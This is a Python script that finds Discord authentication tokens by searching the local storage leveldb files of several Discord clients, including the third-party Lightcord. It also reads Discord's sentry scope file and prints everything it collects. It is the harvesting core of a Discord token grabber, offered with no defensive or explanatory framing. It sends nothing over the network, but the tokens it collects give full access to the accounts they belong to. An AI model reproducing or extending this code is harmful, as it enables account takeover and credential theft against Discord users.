import os
import re
import json

def find_discord_tokens():
    """
    Scans known Discord locations for user tokens.
    Returns a list of found tokens.
    """
    roaming = os.getenv('APPDATA', '')
    paths = [
        os.path.join(roaming, r"discord\Local Storage\leveldb"),
        os.path.join(roaming, r"discordcanary\Local Storage\leveldb"),
        os.path.join(roaming, r"discordptb\Local Storage\leveldb"),
        os.path.join(roaming, r"Lightcord\Local Storage\leveldb"),
    ]
    token_regex = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}")
    found_tokens = []

    for path in paths:
        if not os.path.exists(path):
            continue
        for filename in os.listdir(path):
            if not (filename.endswith('.log') or filename.endswith('.ldb')):
                continue
            file_path = os.path.join(path, filename)
            try:
                with open(file_path, errors='ignore') as f:
                    for line in f:
                        for token in token_regex.findall(line):
                            if token not in found_tokens:
                                found_tokens.append(token)
            except Exception:
                continue
    return found_tokens

def get_discord_sentry_scope(username=None):
    """
    Reads and returns the contents of Discord's sentry scope_v3.json file
    for the specified Windows username (or current user if not specified).
    Returns the parsed JSON object, or None if not found or error.
    """
    if username is None:
        username = os.getlogin()
    file_path = os.path.join(
        "C:\\", "Users", username, "AppData", "Roaming",
        "discord", "sentry", "scope_v3.json"
    )

    if not os.path.exists(file_path):
        return None

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data
    except Exception:
        return None

if __name__ == "__main__":
    tokens = find_discord_tokens()
    if tokens:
        print("Found Discord tokens:")
        for t in tokens:
            print(t)
    else:
        print("No tokens found.")

    # Try to grab the sentry scope file
    sentry_scope = get_discord_sentry_scope()
    if sentry_scope:
        print("\nFound Discord sentry scope_v3.json:")
        print(json.dumps(sentry_scope, indent=2))
    else:
        print("\nNo sentry scope_v3.json found.")
